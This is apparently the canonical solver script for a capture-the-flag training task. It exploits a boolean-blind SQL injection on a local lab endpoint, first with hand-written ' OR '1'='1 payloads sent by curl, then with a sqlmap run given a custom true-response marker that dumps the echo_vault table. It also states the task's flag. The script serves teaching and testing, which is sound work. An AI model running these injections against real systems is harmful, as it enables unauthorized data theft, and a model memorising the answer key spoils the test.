#!/usr/bin/env bash
# solvers/p2_5.sh: Task 2.5 "The Echo Chamber" canonical exploit.
#
# A boolean-blind injection on `whisper` (SELECT 1 FROM echo_words WHERE
# word='{whisper}'), where the response is deliberately noisy: every reply
# carries a fresh random "resonance reading", so sqlmap's default
# true/false auto-detection (which compares response similarity) is
# unreliable, it reports "content is not stable", misses boolean, and falls
# back to slow time-based. The lesson is to define the oracle yourself:
#   - --string="the chamber resonates" tells sqlmap exactly what a TRUE
#     response looks like, cutting through the noise
#   - --technique=B forces the fast boolean path instead of the slow
#     time-based fallback
# Two things make the boolean path work here:
#   1. the marker phrase appears ONLY in a true answer, never in static text
#   2. the base value must itself be a TRUE page (a real word, "resonance"),
#      so AND-based payloads have a true baseline to flip false and back.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{define_your_own_oracle}"
MARKER="the chamber resonates"

WORKDIR=$(mktemp -d)
OUTDIR="${WORKDIR}/sqlmap-out"
LOG="${WORKDIR}/sqlmap.log"
trap 'rm -rf "$WORKDIR"' EXIT

answer() { curl -s -G "${BASE}/p2/echo" --data-urlencode "whisper=$1" \
    | grep -oE "the chamber resonates|only silence" | head -1; }

# --- Step 1: read the oracle by hand (marker only shows on a true match) ---
echo "[p2_5] step 1: confirm the boolean oracle (and that it's noisy)"
echo "  whisper=resonance      -> $(answer 'resonance')      (a real word: TRUE baseline)"
echo "  whisper=' OR '1'='1    -> $(answer "' OR '1'='1")    (forced true)"
echo "  whisper=' OR '1'='2    -> $(answer "' OR '1'='2")    (forced false)"
if [[ "$(answer 'resonance')" != "$MARKER" ]]; then
    echo "[p2_5] FAIL: base word 'resonance' did not return a true page"
    exit 1
fi

# --- Step 2: define the oracle for sqlmap and force the boolean path -------
# Point sqlmap at a request whose base value is already TRUE (whisper=resonance)
# so AND-based boolean has something to flip; --string cuts through the noise;
# --technique=B skips the slow time-based fallback.
echo "[p2_5] step 2: sqlmap -p whisper --technique=B --string=\"${MARKER}\" --dump -T echo_vault"
sqlmap -u "${BASE}/p2/echo?whisper=resonance" -p whisper \
    --batch --ignore-stdin --technique=B --string="${MARKER}" \
    --dump -T echo_vault --output-dir="$OUTDIR" 2>&1 | tee "$LOG" >/dev/null

if grep -qF "$FLAG" "$LOG" || grep -rqF "$FLAG" "$OUTDIR" 2>/dev/null; then
    echo "  ok: flag recovered from sqlmap's boolean dump of echo_vault: ${FLAG}"
    echo "[p2_5] PASS"
    exit 0
else
    echo "[p2_5] FAIL: flag not found in sqlmap output or dump files"
    echo "---- last 30 lines of sqlmap output ----"
    tail -30 "$LOG"
    exit 1
fi
